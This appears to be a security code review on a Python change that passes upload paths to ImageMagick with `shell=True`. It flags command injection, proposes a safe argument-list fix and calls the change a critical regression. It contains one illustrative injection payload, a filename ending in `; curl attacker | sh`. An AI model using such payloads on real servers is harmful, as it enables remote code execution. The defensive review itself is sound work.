findings.body:
If `name` (or `upload_dir`/`oid`) contains shell metacharacters the command becomes arbitrary execution. Example: a filename ending in `; curl attacker | sh` will run on the server.

```suggestion
    subprocess.run(
        ["convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

summary:
Critical command-injection vulnerability introduced by switching to `shell=True` with attacker-controlled path components. The change trades a safe argv list for an unsanitized shell string under the stated rationale of an ImageMagick 7 policy delegate. No escaping, quoting, or validation of the three inputs occurs. This is a direct security regression.
